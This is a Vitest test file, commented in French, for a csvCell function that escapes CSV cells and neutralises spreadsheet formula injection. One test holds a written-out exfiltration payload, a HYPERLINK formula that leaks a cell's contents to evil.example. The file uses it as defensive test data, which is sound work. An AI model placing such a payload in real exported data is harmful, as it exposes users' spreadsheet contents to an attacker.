import { describe, expect, it } from "vitest";
import { csvCell } from "./csv";

describe("csvCell — échappement standard", () => {
  it("laisse une valeur simple intacte", () => {
    expect(csvCell("Marco")).toBe("Marco");
    expect(csvCell("marco@exemple.fr")).toBe("marco@exemple.fr");
  });

  it("entoure de guillemets et double les guillemets internes", () => {
    expect(csvCell('Jean "le grand"')).toBe('"Jean ""le grand"""');
  });

  it("entoure les valeurs contenant séparateurs et sauts de ligne", () => {
    expect(csvCell("a;b")).toBe('"a;b"');
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell("a\nb")).toBe('"a\nb"');
  });

  it("gère null / undefined / nombres", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(42)).toBe("42");
  });
});

describe("csvCell — anti-injection de formule", () => {
  it("neutralise un champ commençant par = + - @", () => {
    // Un tableur exécuterait ces valeurs comme des formules.
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("+1234567890")).toBe("'+1234567890");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("-2+3")).toBe("'-2+3");
  });

  it("neutralise le classique HYPERLINK d'exfiltration", () => {
    const payload = '=HYPERLINK("https://evil.example/?leak="&A1,"clique")';
    const out = csvCell(payload);
    // Préfixé par une apostrophe, puis entouré de guillemets (contient ,").
    expect(out.startsWith("\"'=")).toBe(true);
    expect(out).toContain('""'); // guillemets internes doublés
  });

  it("neutralise même après des espaces de tête (ignorés par le tableur)", () => {
    expect(csvCell("   =cmd")).toBe("'   =cmd");
  });

  it("neutralise les caractères de contrôle tab / retour chariot", () => {
    expect(csvCell("\t=1")).toBe("'\t=1");
  });

  it("ne touche pas au texte légitime commençant par une lettre ou un chiffre", () => {
    expect(csvCell("2026-07-09T10:00:00Z")).toBe("2026-07-09T10:00:00Z");
    expect(csvCell("GAIN-ABCD")).toBe("GAIN-ABCD");
  });
});
